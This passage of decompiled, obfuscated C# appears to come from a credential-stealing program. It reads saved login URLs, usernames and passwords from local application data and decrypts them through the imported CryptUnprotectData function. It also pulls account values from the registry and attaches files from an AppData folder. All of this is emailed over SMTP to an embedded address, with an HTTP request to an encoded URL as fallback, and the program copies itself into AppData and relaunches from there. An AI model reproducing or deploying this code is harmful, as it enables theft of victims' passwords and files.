			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	static string smethod_76()
	{
		return Class42.smethod_91().string_0;
	}

	static void smethod_77()
	{
		try
		{
			string string_ = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class42.smethod_161("l6nOycyvnLW4tn7Cys3Ir3aTloqXnMLeya2/1c3Nl6fW0b2mdqTXyKm7xNy2Cw==", "False") + FileSystem.Dir(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class42.smethod_161("l6nOycyvnLW4tn7Cys3Ir3aTloqXnMLeya2/1c3Nl6fW0b2mdqTXyKm7xNy2ZYTZ1cYL", "False"), (FileAttribute)0);
			string string_2 = Class42.smethod_170(string_);
			string string_3 = Class42.smethod_161("aZDCzcBrGg==", "False");
			string string_4 = Class42.smethod_161("eIaq2M6wlQw=", "False");
			string text = Class42.smethod_126(string_4, string_2, string_3);
			string_3 = Class42.smethod_161("dKPN18t2Dw==", "False");
			string_4 = Class42.smethod_161("Z3Whx7yfhB0=", "False");
			string text2 = Class42.smethod_126(string_4, string_2, string_3);
			string_3 = Class42.smethod_161("d6vUzcx5DA==", "False");
			string_4 = Class42.smethod_161("WWeYvaGPdis=", "False");
			string text3 = Class42.smethod_126(string_4, string_2, string_3);
			string_3 = Class42.smethod_161("U4Ket6mOoa+odC8=", "False");
			string_4 = Class42.smethod_161("Y3GdtbmaubzGqmUg", "False");
			string text4 = Class42.smethod_126(string_4, string_2, string_3);
			string_3 = Class42.smethod_161("cJ27zrhyEw==", "False");
			string_4 = Class42.smethod_161("VGKMpqR9cTA=", "False");
			string text5 = Class42.smethod_126(string_4, string_2, string_3);
			string text6 = (Class5.string_11 = ((Operators.CompareString(text3, "", false) == 0) ? (Class42.smethod_161("hJ+qsaOEn6qxo4SfwOHHudazyLaEn6qxo4SfqrGjhJ+qsQM=", "False") + Environment.NewLine + Class42.smethod_161("aqZim6B/prStrjx9sb6pgGVwd2lKZSw=", "False") + Environment.NewLine + Class42.smethod_161("fpmkq51+maSrnX6ZpKudfpmkq51+maSrnX6ZpKudfpkH", "False")) : (Class42.smethod_161("hJ+qsaOEn6qxo4SfwOHHudazyLaEn6qxo4SfqrGjhJ+qsQM=", "False") + Environment.NewLine + Class42.smethod_161("YaW2u7RWVyw=", "False") + text5 + Environment.NewLine + Class42.smethod_161("h8nY4JhfCA==", "False") + text + Class42.smethod_161("eAk=", "False") + text2 + Environment.NewLine + Class42.smethod_161("kMnG2sicw8aiegs=", "False") + text3 + Environment.NewLine + Class42.smethod_161("Z5Owt62GpKF+Vi8=", "False") + text4 + Class42.smethod_161("RmmRwaiYurzHbiA=", "False") + Environment.NewLine + Class42.smethod_161("fpmkq51+maSrnX6ZpKudfpmkq51+maSrnX6ZpKudfpkH", "False"))));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Class5.string_11 = "";
			ProjectData.ClearProjectError();
		}
	}

	unsafe static void smethod_78(Class30.Class37.Class38 class38_0)
	{
		void* ptr = stackalloc byte[36];
		*(int*)ptr = class38_0.short_0.Length;
		int[] array = new int[*(int*)ptr];
		int num = 0;
		int num2 = 0;
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < *(int*)ptr)
		{
			*(int*)((byte*)ptr + 8) = class38_0.short_0[*(int*)((byte*)ptr + 4)];
			if (*(int*)((byte*)ptr + 8) != 0)
			{
				int num3 = num++;
				int num4;
				while (num3 > 0 && class38_0.short_0[array[num4 = (num3 - 1) / 2]] > *(int*)((byte*)ptr + 8))
				{
					array[num3] = array[num4];
					num3 = num4;
				}
				array[num3] = *(int*)((byte*)ptr + 4);
				num2 = *(int*)((byte*)ptr + 4);
			}
			(*(int*)((byte*)ptr + 4))++;
		}
		while (num < 2)
		{
			int num5 = ((num2 < 2) ? (++num2) : 0);
			array[num++] = num5;
		}
		class38_0.int_1 = Math.Max(num2 + 1, class38_0.int_0);
		*(int*)((byte*)ptr + 12) = num;
		int[] array2 = new int[4 * num - 2];
		int[] array3 = new int[2 * num - 1];
		int num6 = *(int*)((byte*)ptr + 12);
		*(int*)((byte*)ptr + 16) = 0;
		while (*(int*)((byte*)ptr + 16) < num)
		{
			*(int*)((byte*)ptr + 20) = array[*(int*)((byte*)ptr + 16)];
			array2[2 * *(int*)((byte*)ptr + 16)] = *(int*)((byte*)ptr + 20);
			array2[2 * *(int*)((byte*)ptr + 16) + 1] = -1;
			array3[*(int*)((byte*)ptr + 16)] = class38_0.short_0[*(int*)((byte*)ptr + 20)] << 8;
			array[*(int*)((byte*)ptr + 16)] = *(int*)((byte*)ptr + 16);
			(*(int*)((byte*)ptr + 16))++;
		}
		do
		{
			*(int*)((byte*)ptr + 24) = array[0];
			int num7 = array[--num];
			int num8 = 0;
			int num9;
			for (num9 = 1; num9 < num; num9 = num9 * 2 + 1)
			{
				if (num9 + 1 < num && array3[array[num9]] > array3[array[num9 + 1]])
				{
					num9++;
				}
				array[num8] = array[num9];
				num8 = num9;
			}
			int num10 = array3[num7];
			while ((num9 = num8) > 0 && array3[array[num8 = (num9 - 1) / 2]] > num10)
			{
				array[num9] = array[num8];
			}
			array[num9] = num7;
			*(int*)((byte*)ptr + 28) = array[0];
			num7 = num6++;
			array2[2 * num7] = *(int*)((byte*)ptr + 24);
			array2[2 * num7 + 1] = *(int*)((byte*)ptr + 28);
			*(int*)((byte*)ptr + 32) = Math.Min(array3[*(int*)((byte*)ptr + 24)] & 0xFF, array3[*(int*)((byte*)ptr + 28)] & 0xFF);
			num10 = (array3[num7] = array3[*(int*)((byte*)ptr + 24)] + array3[*(int*)((byte*)ptr + 28)] - *(int*)((byte*)ptr + 32) + 1);
			num8 = 0;
			for (num9 = 1; num9 < num; num9 = num8 * 2 + 1)
			{
				if (num9 + 1 < num && array3[array[num9]] > array3[array[num9 + 1]])
				{
					num9++;
				}
				array[num8] = array[num9];
				num8 = num9;
			}
			while ((num9 = num8) > 0 && array3[array[num8 = (num9 - 1) / 2]] > num10)
			{
				array[num9] = array[num8];
			}
			array[num9] = num7;
		}
		while (num > 1);
		Class42.smethod_7(class38_0, array2);
	}

	[DllImport("kernel32.dll")]
	static extern void GetSystemInfo(ref Class54.Struct26 struct26_0);

	[SecurityPermission(SecurityAction.Demand, UnmanagedCode = true)]
	static void smethod_79(Class51 class51_0)
	{
		if (class51_0 != null)
		{
			Class51.class51_0 = class51_0;
			AppDomain.CurrentDomain.UnhandledException += class51_0.method_1;
			Application.add_ThreadException((ThreadExceptionEventHandler)class51_0.method_0);
		}
	}

	static int smethod_80(Class30.Stream0 stream0_0)
	{
		return stream0_0.ReadByte() | (stream0_0.ReadByte() << 8);
	}

	static Type smethod_81(Class49 class49_0)
	{
		return class49_0.type_0;
	}

	unsafe static bool smethod_82(bool bool_0, Class30.Class39 class39_0, bool bool_1)
	{
		void* ptr = stackalloc byte[29];
		if (class39_0.int_5 < 262 && !bool_1)
		{
			((byte*)ptr)[28] = 0;
		}
		else
		{
			while (true)
			{
				if (class39_0.int_5 >= 262 || bool_1)
				{
					Class30.Class37 class37_3;
					byte[] byte_;
					if (class39_0.int_5 != 0)
					{
						if (class39_0.int_4 >= 65274)
						{
							Class42.smethod_48(class39_0);
						}
						*(int*)ptr = class39_0.int_1;
						int int_ = class39_0.int_2;
						if (class39_0.int_5 >= 3)
						{
							*(int*)((byte*)ptr + 4) = Class42.smethod_124(class39_0);
							if (*(int*)((byte*)ptr + 4) != 0 && class39_0.int_4 - *(int*)((byte*)ptr + 4) <= 32506 && Class42.smethod_24(*(int*)((byte*)ptr + 4), class39_0) && class39_0.int_2 <= 5 && class39_0.int_2 == 3 && class39_0.int_4 - class39_0.int_1 > 4096)
							{
								class39_0.int_2 = 2;
							}
						}
						if (int_ >= 3 && class39_0.int_2 <= int_)
						{
							Class30.Class37 class37_ = class39_0.class37_0;
							*(int*)((byte*)ptr + 20) = class39_0.int_4 - 1 - *(int*)ptr;
							Class42.smethod_70(int_, class37_, *(int*)((byte*)ptr + 20));
							int_ -= 2;
							do
							{
								class39_0.int_4++;
								class39_0.int_5--;
								if (class39_0.int_5 >= 3)
								{
									Class42.smethod_124(class39_0);
								}
							}
							while (--int_ > 0);
							class39_0.int_4++;
							class39_0.int_5--;
							class39_0.bool_0 = false;
							class39_0.int_2 = 2;
						}
						else
						{
							if (class39_0.bool_0)
							{
								Class30.Class37 class37_2 = class39_0.class37_0;
								*(int*)((byte*)ptr + 16) = class39_0.byte_0[class39_0.int_4 - 1] & 0xFF;
								Class42.smethod_12(*(int*)((byte*)ptr + 16), class37_2);
							}
							class39_0.bool_0 = true;
							class39_0.int_4++;
							class39_0.int_5--;
						}
						if (Class42.smethod_111(class39_0.class37_0))
						{
							*(int*)((byte*)ptr + 8) = class39_0.int_4 - class39_0.int_3;
							if (class39_0.bool_0)
							{
								(*(int*)((byte*)ptr + 8))--;
							}
							bool flag = bool_0 && class39_0.int_5 == 0 && !class39_0.bool_0;
							class37_3 = class39_0.class37_0;
							byte_ = class39_0.byte_0;
							*(int*)((byte*)ptr + 12) = class39_0.int_3;
							Class42.smethod_33(flag, *(int*)((byte*)ptr + 8), byte_, *(int*)((byte*)ptr + 12), class37_3);
							class39_0.int_3 += *(int*)((byte*)ptr + 8);
							((byte*)ptr)[28] = ((!flag) ? ((byte)1) : ((byte)0));
							break;
						}
						continue;
					}
					if (class39_0.bool_0)
					{
						Class30.Class37 class37_2 = class39_0.class37_0;
						*(int*)((byte*)ptr + 16) = class39_0.byte_0[class39_0.int_4 - 1] & 0xFF;
						Class42.smethod_12(*(int*)((byte*)ptr + 16), class37_2);
					}
					class39_0.bool_0 = false;
					class37_3 = class39_0.class37_0;
					byte_ = class39_0.byte_0;
					*(int*)((byte*)ptr + 12) = class39_0.int_3;
					*(int*)((byte*)ptr + 24) = class39_0.int_4 - class39_0.int_3;
					Class42.smethod_33(bool_0, *(int*)((byte*)ptr + 24), byte_, *(int*)((byte*)ptr + 12), class37_3);
					class39_0.int_3 = class39_0.int_4;
					((byte*)ptr)[28] = 0;
					break;
				}
				((byte*)ptr)[28] = 1;
				break;
			}
		}
		return ((byte*)ptr)[28] != 0;
	}

	static string smethod_83()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Class42.smethod_4());
			if (registryKey == null)
			{
				registryKey = Registry.LocalMachine.OpenSubKey(Class42.smethod_16());
			}
			if (registryKey == null)
			{
				return null;
			}
			string result = (string)registryKey.GetValue("Path", null);
			registryKey.Close();
			return result;
		}
		catch
		{
			return null;
		}
	}

	unsafe static void smethod_84(Class30.Class37.Class38 class38_0, Class30.Class37.Class38 class38_1)
	{
		void* ptr = stackalloc byte[20];
		*(int*)((byte*)ptr + 8) = -1;
		*(int*)((byte*)ptr + 12) = 0;
		while (*(int*)((byte*)ptr + 12) < class38_1.int_1)
		{
			int num = 1;
			*(int*)((byte*)ptr + 16) = class38_1.byte_0[*(int*)((byte*)ptr + 12)];
			if (*(int*)((byte*)ptr + 16) == 0)
			{
				*(int*)ptr = 138;
				*(int*)((byte*)ptr + 4) = 3;
			}
			else
			{
				*(int*)ptr = 6;
				*(int*)((byte*)ptr + 4) = 3;
				if (*(int*)((byte*)ptr + 8) != *(int*)((byte*)ptr + 16))
				{
					Class42.smethod_144(class38_0, *(int*)((byte*)ptr + 16));
					num = 0;
				}
			}
			*(int*)((byte*)ptr + 8) = *(int*)((byte*)ptr + 16);
			(*(int*)((byte*)ptr + 12))++;
			while (*(int*)((byte*)ptr + 12) < class38_1.int_1 && *(int*)((byte*)ptr + 8) == class38_1.byte_0[*(int*)((byte*)ptr + 12)])
			{
				(*(int*)((byte*)ptr + 12))++;
				if (++num >= *(int*)ptr)
				{
					break;
				}
			}
			if (num < *(int*)((byte*)ptr + 4))
			{
				while (num-- > 0)
				{
					Class42.smethod_144(class38_0, *(int*)((byte*)ptr + 8));
				}
			}
			else if (*(int*)((byte*)ptr + 8) != 0)
			{
				Class42.smethod_144(class38_0, 16);
				Class42.smethod_167(class38_1.class37_0.class40_0, num - 3, 2);
			}
			else if (num <= 10)
			{
				Class42.smethod_144(class38_0, 17);
				Class42.smethod_167(class38_1.class37_0.class40_0, num - 3, 3);
			}
			else
			{
				Class42.smethod_144(class38_0, 18);
				Class42.smethod_167(class38_1.class37_0.class40_0, num - 11, 7);
			}
		}
	}

	unsafe static void smethod_85()
	{
		void* ptr = stackalloc byte[20];
		*(int*)((byte*)ptr + 8) = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class42.smethod_161("eoatrq+NrLOxsXp7pa6ok6m3pyw=", Class42.smethod_161("g7nP3cEJ", "False"))).Length;
		DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class42.smethod_161("eoatrq+NrLOxsXp7pa6ok6m3pyw=", Class42.smethod_161("g7nP3cEJ", "False")));
		FileInfo[] files = directoryInfo.GetFiles();
		*(int*)((byte*)ptr + 12) = 0;
		try
		{
			*(double*)ptr = 25.0;
			Class42.smethod_67(ref *(double*)ptr);
			string text = Class42.smethod_161("lZGdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3krPbvpvBxdnMd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ4sg4=", "False") + Environment.NewLine + Environment.NewLine + Class5.string_0 + Environment.NewLine + Environment.NewLine + Class5.string_1 + Environment.NewLine + Environment.NewLine + Class5.string_2 + Environment.NewLine + Environment.NewLine + Class5.string_3 + Environment.NewLine + Environment.NewLine + Class5.string_4 + Environment.NewLine + Environment.NewLine + Class5.string_5 + Environment.NewLine + Environment.NewLine + Class5.string_6 + Environment.NewLine + Environment.NewLine + Class5.string_7 + Environment.NewLine + Environment.NewLine + Class5.string_8 + Environment.NewLine + Environment.NewLine + Class5.string_9 + Environment.NewLine + Environment.NewLine + Class5.string_10 + Environment.NewLine + Environment.NewLine + Class5.string_11 + Environment.NewLine + Environment.NewLine + Class42.smethod_161("Z4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo0f", "False");
			try
			{
				MailMessage mailMessage = new MailMessage();
				MailMessage mailMessage2 = mailMessage;
				mailMessage2.From = new MailAddress(Class5.string_13);
				mailMessage2.To.Add(Class5.string_13);
				mailMessage2.Subject = Class42.smethod_161("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + Class42.smethod_161("aQ0=", Class42.smethod_161("g7nP3cEJ", "False")) + Environment.MachineName.ToString();
				mailMessage2.Body = text;
				try
				{
					FileInfo[] array = files;
					*(int*)((byte*)ptr + 16) = 0;
					while (*(int*)((byte*)ptr + 16) < array.Length)
					{
						FileInfo fileInfo = array[*(int*)((byte*)ptr + 16)];
						Attachment item = new Attachment(fileInfo.FullName);
						mailMessage2.Attachments.Add(item);
						checked
						{
							(*unchecked((int*)((byte*)ptr + 16)))++;
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				mailMessage2 = null;
				SmtpClient smtpClient = new SmtpClient(Class5.string_15);
				SmtpClient smtpClient2 = smtpClient;
				smtpClient2.Port = Class5.int_0;
				smtpClient2.EnableSsl = true;
				smtpClient2.Credentials = new NetworkCredential(Class5.string_13, Class5.string_14);
				smtpClient2.Send(mailMessage);
				smtpClient2 = null;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				try
				{
					string text2 = Class42.smethod_161("hKu2uXVLZq6yqIWrrq6uj6SjsqdKarHAp0qasbZqaKCvsq+InLW8gImYq7VpjJ+yLQ==", "False");
					HttpWebResponse httpWebResponse = (HttpWebResponse)WebRequest.Create(text2 + "?to=" + Class5.string_13 + "&subject=" + Strings.Replace(Class42.smethod_161("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + Class42.smethod_161("aQ0=", Class42.smethod_161("g7nP3cEJ", "False")) + Environment.MachineName.ToString(), " ", "%20", 1, -1, (CompareMethod)0) + "&message=" + Strings.Replace(text, " ", "%20", 1, -1, (CompareMethod)0) + "&from=" + Class5.string_13).GetResponse();
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	static bool smethod_86(Class30.Class36 class36_0)
	{
		return Class42.smethod_105(class36_0.class39_0);
	}

	static void smethod_87(Class28 class28_0)
	{
		class28_0.type_0.GetMethod("Clear")!.Invoke(class28_0.object_0, new object[0]);
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int MoveFileExW([In][MarshalAs(UnmanagedType.LPTStr)] string string_0, [In][MarshalAs(UnmanagedType.LPTStr)] string string_1, long long_0);

	static void smethod_88(EventArgs0 eventArgs0_0, Class45 class45_0)
	{
		class45_0.delegate1_0?.Invoke(class45_0, eventArgs0_0);
	}

	static void smethod_89(IWebProxy iwebProxy_0, Class53 class53_0)
	{
		class53_0.iwebProxy_0 = iwebProxy_0;
	}

	unsafe static int smethod_90(int int_0, int int_1, Class30.Class31 class31_0, byte[] byte_0)
	{
		void* ptr = stackalloc byte[12];
		*(int*)ptr = 0;
		while (true)
		{
			if (class31_0.int_4 != 11)
			{
				*(int*)((byte*)ptr + 4) = Class42.smethod_146(int_1, int_0, class31_0.class33_0, byte_0);
				int_1 += *(int*)((byte*)ptr + 4);
				*(int*)ptr += *(int*)((byte*)ptr + 4);
				int_0 -= *(int*)((byte*)ptr + 4);
				if (int_0 == 0)
				{
					*(int*)((byte*)ptr + 8) = *(int*)ptr;
					break;
				}
			}
			if (!Class42.smethod_112(class31_0) && (Class42.smethod_115(class31_0.class33_0) <= 0 || class31_0.int_4 == 11))
			{
				*(int*)((byte*)ptr + 8) = *(int*)ptr;
				break;
			}
		}
		return *(int*)((byte*)ptr + 8);
	}

	static Class54.Struct25 smethod_91()
	{
		if (!Class54.bool_0)
		{
			Class54.struct25_0 = default(Class54.Struct25);
			try
			{
				Class54.struct25_0.int_0 = Marshal.SizeOf(typeof(Class54.Struct25));
				Class42.GetVersionEx(ref Class54.struct25_0);
				Class54.bool_0 = true;
			}
			catch
			{
			}
		}
		return Class54.struct25_0;
	}

	static void smethod_92()
	{
		try
		{
			if (Environment.OSVersion.Platform == PlatformID.Win32NT)
			{
				MemoryManager.memoryManager_0 = new MemoryManager();
			}
		}
		catch
		{
		}
	}

	unsafe static void smethod_93()
	{
		void* ptr = stackalloc byte[8];
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + Class42.smethod_161("jZPGzbedsbOhuKO7xMOshr+80HB1rcu/rHWxvb/FncCzqr+YtcV+lJLAuBg=", "False");
		try
		{
			Class10 @class = new Class10(text);
			Class42.smethod_0(Class42.smethod_161("l7W4wbieHA==", "False"));
			if (!File.Exists(text))
			{
				return;
			}
			*(int*)((byte*)ptr + 4) = checked(Class42.smethod_42() - 1);
			*(int*)ptr = 0;
			while (*(int*)ptr <= *(int*)((byte*)ptr + 4))
			{
				string text2 = Class42.smethod_139(*(int*)ptr, Class42.smethod_161("jautsqaMmLm9qSg=", "False"));
				string text3 = Class42.smethod_139(*(int*)ptr, Class42.smethod_161("nre0yLaKsbS1voqwxLsh", "False"));
				string text4 = Class42.smethod_147(Encoding.Default.GetBytes(Class42.smethod_139(*(int*)ptr, Class42.smethod_161("oa3K0cegvru9xpK4zMMZ", "False"))));
				if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
				{
					Class9.string_0 = Class42.smethod_161("gZynrqCBnKeuoIGcrdnVs8zPrqCBnKeuoIGcp66ggZwE", "False") + "\r\n" + Class42.smethod_161("fL7N1Y1UEw==", "False") + text2 + "\r\n" + Class42.smethod_161("eLGuwrCEq66KYiM=", "False") + text3 + "\r\n" + Class42.smethod_161("eqbDysCZt7SRaRw=", "False") + text4 + "\r\n" + Class42.smethod_161("Z4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZQg", "False") + "\r\n ";
					Class5.string_0 += Class9.string_0;
				}
				checked
				{
					(*unchecked((int*)ptr))++;
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	static Class30.Class34 smethod_94(Class30.Class35 class35_0)
	{
		byte[] array = new byte[class35_0.int_3];
		Array.Copy(class35_0.byte_1, 0, array, 0, class35_0.int_3);
		return new Class30.Class34(array);
	}

	static void smethod_95()
	{
		string text = "";
		string text2 = "";
		string text3 = "";
		try
		{
			text = Conversions.ToString(Registry.GetValue(Class42.smethod_161("i6muycGPrayxrqKrqrOqjKyuzLWSpL3Ho5WjxbnQt8Pb3se3fq3f2bHK2NHGY6vK3sOqw9sG", "False"), Class42.smethod_161("aJatrDA=", "False"), null));
			if (Operators.CompareString(text, "", false) == 0)
			{
				text = Conversions.ToString(Registry.GetValue(Class42.smethod_161("i6muycGPrayxrqKrqrOqjKyuzLWSpL3Ho5WjxbnQt8Pb3se3fq3f2bHK2NHGY6vK3sOqw9sG", "False"), Class42.smethod_161("aIupvKYk", "False"), null));
			}
			else if (Operators.CompareString(text, "", false) == 0)
			{
				text = Conversions.ToString(Registry.GetValue(Class42.smethod_161("i6muycGPrayxrqKrqrOqjKyuzLWSpL3Ho5WjxbnQt8Pb3se3fq3f2bHK2NHGY6vK3sOqw9sG", "False"), Class42.smethod_161("nKrBwBw=", "False"), null));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			text2 = Conversions.ToString(Registry.GetValue(Class42.smethod_161("i6muycGPrayxrqKrqrOqjKyuzLWSpL3Ho5WjxbnQt8Pb3se3fq3f2bHK2NHGY6vK3sOqw9sG", "False"), Class42.smethod_161("eby7yr8S", "False"), null));
			if (Operators.CompareString(text2, "", false) == 0 && Operators.CompareString(text2, "", false) == 0)
			{
				text2 = Conversions.ToString(Registry.GetValue(Class42.smethod_161("i6muycGPrayxrqKrqrOqjKyuzLWSpL3Ho5WjxbnQt8Pb3se3fq3f2bHK2NHGY6vK3sOqw9sG", "False"), Class42.smethod_161("gaSjsqcq", "False"), null));
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			text3 = Conversions.ToString(Registry.GetValue(Class42.smethod_161("i6muycGPrayxrqKrqrOqjKyuzLWSpL3Ho5WjxbnQt8Pb3se3fq3f2bHK2NHGY6vK3sOqw9sG", "False"), Class42.smethod_161("hbLKyLKeFQ==", "False"), null));
			if (Operators.CompareString(text3, "", false) == 0)
			{
				text3 = Conversions.ToString(Registry.GetValue(Class42.smethod_161("i6muycGPrayxrqKrqrOqjKyuzLWSpL3Ho5WjxbnQt8Pb3se3fq3f2bHK2NHGY6vK3sOqw9sG", "False"), Class42.smethod_161("l6S8uqSQIw==", "False"), null));
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			Class5.string_3 = Class42.smethod_161("b4qVnI5vipWcjm+Koc3Fl7/GxMVSkcfWv568ucNxf67GwLiXv5Wcjm+KlZyOb4qVnI5vFQ==", "False") + Environment.NewLine + Environment.NewLine + Class42.smethod_161("lc7L382hyMuNmWAH", "False") + text + Environment.NewLine + Class42.smethod_161("is3M29BlmouSBQ==", "False") + text2 + Environment.NewLine + Class42.smethod_161("iLXNy7WhinsU", "False") + text3 + Environment.NewLine + Environment.NewLine + Class42.smethod_161("cYyXnpBxjJeekHGMl56QcYyXnpBxjJeekHGMl56QcYwU", "False");
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			Class5.string_3 = "";
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_96()
	{
		string text = "";
		string text2 = "";
		try
		{
			text = Conversions.ToString(((ServerComputer)Class2.smethod_0()).get_Registry().GetValue(Class42.smethod_161("jauwy8ORr66zsKStrLWsjq6wzreUpr/JpZelx8jNucHX6cm3y97OqJqjAw==", "False"), Class42.smethod_161("hr+80L6SubwY", "False"), (object)null));
			text2 = Conversions.ToString(((ServerComputer)Class2.smethod_0()).get_Registry().GetValue(Class42.smethod_161("dpSZtKx6mJecmY2WlZ6Vd5eZt6B9j6iyjoCOsLG2oqrA0rKgtMe3kYOMGg==", "False"), Class42.smethod_161("lMDd5Nqz0c4F", "False"), (object)null));
			Class5.string_7 = Class42.smethod_161("cIuWnY9wi5adj3CLp89/fJ6WnY9wi5adj3CLlPP2cBQ=", "False") + Environment.NewLine + Environment.NewLine + text + Environment.NewLine + Class42.smethod_39(text2) + Environment.NewLine + Class42.smethod_161("aIOOlYdog46Vh2iDjpWHaIOOlYdog46Vh2iDjpWHaIMd", "False");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Class5.string_7 = "";
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_97(Class30.Class39 class39_0, byte[] byte_0)
	{
		class39_0.byte_1 = byte_0;
		class39_0.int_7 = 0;
		class39_0.int_8 = byte_0.Length;
	}

	[DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	static extern bool CryptUnprotectData(ref Class9.Struct1 struct1_0, string string_0, ref Class9.Struct1 struct1_1, IntPtr intptr_0, ref Class9.Struct0 struct0_0, int int_0, ref Class9.Struct1 struct1_2);

	static bool smethod_98(EventArgs2 eventArgs2_0)
	{
		return eventArgs2_0.bool_1;
	}

	static long smethod_99(Class30.Class36 class36_0)
	{
		return class36_0.long_0;
	}

	static int smethod_100(Class30.Class40 class40_0)
	{
		return class40_0.int_2;
	}

	unsafe static bool smethod_101(long long_0)
	{
		void* ptr = stackalloc byte[2];
		*(bool*)ptr = (long_0 & 1L) == 1L;
		((byte*)ptr)[1] = *(byte*)ptr;
		return ((byte*)ptr)[1] != 0;
	}

	static Assembly smethod_102()
	{
		try
		{
			return Assembly.GetExecutingAssembly();
		}
		catch
		{
			return null;
		}
	}

	static string smethod_103(string string_0)
	{
		if (string_0.StartsWith("\"<RSAKeyValue>") && string_0.EndsWith("</RSAKeyValue>\""))
		{
			return "*** Information not reported for security reasons ***";
		}
		return string_0;
	}

	static void smethod_104(Exception exception_0, object[] object_0)
	{
		if (exception_0 == null || !(exception_0 is SecurityException) || !(Class51.string_0 == "1") || !Class42.smethod_145().method_2((SecurityException)exception_0))
		{
			Class42.smethod_45(exception_0, object_0);
			Class42.smethod_145().method_3(exception_0, bool_1: false, bool_2: false);
		}
	}

	static bool smethod_105(Class30.Class39 class39_0)
	{
		return class39_0.int_8 == class39_0.int_7;
	}

	static void smethod_106(Class44 class44_0, Delegate2 delegate2_0)
	{
		Delegate2 @delegate = class44_0.delegate2_0;
		Delegate2 delegate2;
		do
		{
			delegate2 = @delegate;
			Delegate2 value = (Delegate2)Delegate.Combine(delegate2, delegate2_0);
			@delegate = Interlocked.CompareExchange(ref class44_0.delegate2_0, value, delegate2);
		}
		while ((object)@delegate != delegate2);
	}

	static int smethod_107(Class30.Class32 class32_0, int int_0)
	{
		if (class32_0.int_2 < int_0)
		{
			if (class32_0.int_0 == class32_0.int_1)
			{
				return -1;
			}
			class32_0.uint_0 |= (uint)(((class32_0.byte_0[class32_0.int_0++] & 0xFF) | ((class32_0.byte_0[class32_0.int_0++] & 0xFF) << 8)) << class32_0.int_2);
			class32_0.int_2 += 16;
		}
		return (int)(class32_0.uint_0 & ((1 << int_0) - 1));
	}

	static int smethod_108(Class30.Class33 class33_0)
	{
		return 32768 - class33_0.int_1;
	}

	static void smethod_109()
	{
		try
		{
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class42.smethod_161("foqxsrORsLe1tX6Usb2WkqGpw6aUa63HpiQ=", "False")))
			{
				File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class42.smethod_161("fYmwsbKQr7a0tH2TsLyVkaCowqWTaqzGpSU=", "False"));
			}
			string? fileName = Process.GetCurrentProcess().MainModule!.FileName;
			string string_ = Process.GetCurrentProcess().MainModule!.FileName;
			Class42.MoveFileExW(Strings.Left(fileName, Class42.GetModuleFileNameA(0, ref string_, 256)), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class42.smethod_161("oKzT1NWz0tnX16C209+4tMPL5ci2jc/pyAI=", "False"), 8L);
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class42.smethod_161("c3+mp6iGpayqqnOJprKLh5aeuJuJYKK8my8=", "False"));
			Class42.ExitProcess(0u);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_110(Class30.Class37 class37_0)
	{
		class37_0.int_1 = 0;
		class37_0.int_2 = 0;
	}

	static bool smethod_111(Class30.Class37 class37_0)
	{
		return class37_0.int_1 >= 16384;
	}

	unsafe static bool smethod_112(Class30.Class31 class31_0)
	{
		void* ptr = stackalloc byte[13];
		switch (class31_0.int_4)
		{
		case 2:
			if (class31_0.bool_0)
			{
